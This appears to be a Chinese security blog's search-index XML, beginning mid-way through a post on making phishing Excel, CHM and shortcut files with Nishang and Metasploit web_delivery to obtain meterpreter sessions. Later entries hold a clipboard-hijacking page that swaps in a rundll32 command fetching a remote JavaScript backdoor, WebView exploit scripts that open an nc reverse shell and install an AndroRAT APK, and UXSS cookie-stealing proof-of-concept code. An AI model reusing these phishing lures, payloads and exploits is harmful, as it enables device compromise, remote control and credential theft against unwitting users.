windows/meterpreter/reverse_tcpmsf exploit(web_delivery) &gt; set LHOST 192.168.52.129LHOST =&gt; 192.168.52.129msf exploit(web_delivery) &gt; set URIPATH /URIPATH =&gt; msf exploit(web_delivery) &gt; exploit 开启服务如下图： 使用Out-Excel.ps1制作excel钓鱼文件:12345678D:\temp&gt;powershellWindows PowerShell版权所有 (C) 2015 Microsoft Corporation。保留所有权利。PS D:\temp&gt; . .\Out-Excel.ps1PS D:\temp&gt; Out-Excel -PayloadURL http://192.168.52.129:8080/ -OutputFile D:\temp\test.xlsSaved to file D:\temp\test.xls0 其中 http://192.168.52.129:8080/是msf开启的服务地址。运行excel，获取meterpreter会话如下图： 0x03制作chm钓鱼文件依然使用msf开启powershell的web_delivery，使用Out-CHM制作chm钓鱼文件：12345678910111213141516PS D:\temp&gt; Out-CHM -PayloadURL http://192.168.52.129:8080/ -HHCPath "C:\Program Files (x86)\HTML Help Workshop"Microsoft HTML Help Compiler 4.74.8702Compiling d:\temp\doc.chmCompile time: 0 minutes, 1 second2 Topics4 Local links4 Internet links0 GraphicsCreated d:\temp\doc.chm, 13,524 bytesCompression increased file by 324 bytes.PS D:\temp&gt; 运行doc.chm,获取meterpreter会话: 缺点是会弹出黑框框。丢给几个小伙伴测试，都上线了（23333）。 0x04制作快捷方式钓鱼文件依然使用之前开启的web_delivery,使用Out-Shortcut制作快捷方式钓鱼文件。 123PS D:\temp&gt; . .\Out-Shortcut.ps1PS D:\temp&gt; Out-Shortcut -PayloadURL http://192.168.52.129:8080/ -HotKey 'F3' -Icon 'notepad.exe'The Shortcut file has been written as D:\temp\Shortcut to File Server.lnk 其中PayloadURL为web_delivery服务地址，Icon为快捷方式的图标，HotKey为快捷键。右键属性快捷方式，可以看到快捷方式指向我们的服务地址，如下图： 运行快捷方式，可以获取meterpreter会话： 0x05小结测试发现，上面几个方式还是挺有效的，使用chm方式更容易成功些，因为使用了powershell，防护软件并没有报警，其中还有WebQuery、java以及hta类型的钓鱼文件生成脚本，笔者测试java以及hta方式的没有成功，这里就不介绍了，至于WebQuery方式的在FB上已经有详细的介绍：传送门 有兴趣的小伙伴可以继续研究研究。]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2Fa.html</url>
    <content type="text"><![CDATA[Copy the text below and run it in your terminal for totally not evil things to happen. echo "not evil" function copyTextToClipboard(text) { var textArea = document.createElement("textarea"); // // *** This styling is an extra step which is likely not required. *** // // Why is it here? To ensure: // 1. the element is able to have focus and selection. // 2. if element was to flash render it has minimal visual impact. // 3. less flakyness with selection and copying which **might** occur if // the textarea element is not visible. // // The likelihood is the element won't even render, not even a flash, // so some of these are just precautions. However in IE the element // is visible whilst the popup box asking the user for permission for // the web page to copy to the clipboard. // // Place in top-left corner of screen regardless of scroll position. textArea.style.position = 'fixed'; textArea.style.top = 0; textArea.style.left = 0; // Ensure it has a small width and height. Setting to 1px / 1em // doesn't work as this gives a negative w/h on some browsers. textArea.style.width = '2em'; textArea.style.height = '2em'; // We don't need padding, reducing the size if it does flash render. textArea.style.padding = 0; // Clean up any borders. textArea.style.border = 'none'; textArea.style.outline = 'none'; textArea.style.boxShadow = 'none'; // Avoid flash of white box if rendered for any reason. textArea.style.background = 'transparent'; textArea.value = text; document.body.appendChild(textArea); textArea.select(); try { var successful = document.execCommand('copy'); var msg = successful ? 'successful' : 'unsuccessful'; console.log('Copying text command was ' + msg); } catch (err) { console.log('Oops, unable to copy'); } document.body.removeChild(textArea); } document.addEventListener('keydown', function(event) { var ms = 800; var start = new Date().getTime(); var end = start; while(end < start + ms) { end = new Date().getTime(); } copyTextToClipboard('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")\ncls\necho "not evil"'); }); L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
  </entry>
  <entry>
    <title><![CDATA[404 Not Found：该页无法显示]]></title>
    <url>%2F%2F404.html</url>
    <content type="text"><![CDATA[&lt;!DOCTYPE html&gt; 404 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Archive]]></title>
    <url>%2Farchive%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Categories]]></title>
    <url>%2Fcategories%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[友情链接]]></title>
    <url>%2Ffriends%2Findex.html</url>
    <content type="text"><![CDATA[快来交换友链吧~~ 交换友链须知 优先于技术、生活分享类博客站点友链，坚决不和论坛、导航、含有暴力等不健康信息内容站点做任何交换。 申请链接前请先添加本博链接。 申请请提供：站点名称、站点链接（请提供 https 协议链接）。 一些大佬和他们的博客。 三好学生博客 zEqueue’s Blog erevus’s blog Evi1oX’s blog 维尼熊宝贝Beta的熊窝 bsmali4的小窝 wdog’s blog Storm’s Blog freearoot’s Blog bPJoanna Patrilic’s Blog]]></content>
  </entry>
  <entry>
    <title><![CDATA[search]]></title>
    <url>%2Fsearch%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Tags]]></title>
    <url>%2Ftags%2Findex.html</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[Tools]]></title>
    <url>%2Ftools%2Findex.html</url>
    <content type="text"><![CDATA[1 .PHP序列化注入 Link 2 .Webshells Link 3 .Powershell取证工具 Link 4 .各种小工具 Link 5 .DLL_Hijacker Link 6 .WebView检测 Link 7 .Uxss检测 Link POC1 POC2 8.FlashCSRF Link 9.在线工具 Link 10.图形化PowerShell的在线编辑器 Link 11.Duck ToolKit Link 12.在线C段查询 Link 13.reg2powershell Link 14.XSSOR Link github 15.正则分析 Link 16.Powershell压缩文件 Link….]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fwebview.html</url>
    <content type="text"><![CDATA[WebView 漏洞检测 如果当前 app 存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改： function check() { for (var obj in window) { try { if ("getClass" in window[obj]) { try{ window[obj].getClass(); document.write(''+obj+''); document.write(''); }catch(e){ } } } catch(e) { } } } check(); 检测出漏洞使用以下脚本验证(自行修改)： 1 .写文件 2 .反弹shell 3 .发短信 3 .挂马 参考 L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fweibo.html</url>
    <content type="text"><![CDATA[weibo test console.log('init...'); window.__fla_ready = function() { console.log('loading...'); fla.Load('http://www.weibo.com/messages?topnav=1#'); }; window.__fla_complete = function(data) { document.write(data); console.info('recv:\n%s', data); };]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2FflashCSRF%2FContentHijacking.html</url>
    <content type="text"><![CDATA[Cross Site Content Hijacking Demo! html, body { height: 100%; overflow: auto; } body { padding: 0; margin: 0; } table { /* table-layout: fixed;*/ border-collapse: collapse; border-spacing: 0; width: 100%; } th { font-family: verdana; color: white; vertical-align: middle; background-color: black; } td { font-family: verdana; word-wrap:break-word; height: 30px; max-width: 600px; } #silverlightControlHost { height: 100%; text-align:center; } .info { background: #ffff00; } .logdata:nth-last-child(2n-1) { background: #ccc; } .logdata { white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word; overflow:auto; max-height: 300px; } .note { font-family: courier; font-size: 15px; } //PDF related var isPDFLoaded = 0; function createMessageHandler(objPDF) { if(objPDF != null){ objPDF.messageHandler = { onMessage: function(msg) { try{ if(msg[0]=='loaded' && msg[1]=='1'){ // The created PDF files sends the load message continuously for 5 seconds to make sure HTML is ready... if(isPDFLoaded===1) return; isPDFLoaded = 1; pdfLoaded(); }else{ javaScriptLogData(msg[0]); } }catch(e){ } }, onError: function(error, msg) { alert(error.message); } } } } var objPDFCheckInterval; var objPDFCheckIntervalCounter = 0; // This function is called from JavaScript via setTimeout. function pdfLoaded() { objPDFCheckIntervalCounter++; var objPDF = document.getElementById('myObject'); if(isPDFLoaded===1){ clearTimeout(objPDFCheckInterval); javaScriptLogData("PDF object has been loaded successfuly."); callTheObj(); }else if(objPDFCheckIntervalCounter]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
    <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2FflashCSRF%2Findex.html</url>
    <content type="text"><![CDATA[document.location = 'ContentHijacking.html';]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
    <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fwebviewpoc%2Fguama.js</url>
    <content type="text"><![CDATA[function execute(cmdArgs) { return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4 var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94 var armBinary3=… var armBinary4=… …… var patharm = "/mnt/sdcard/Androrat.apk"; var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]); //alert(a); execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary3+ >> " + patharm]); execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]); execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]); alert("over !!!");]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
    <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
  </entry>
</search>
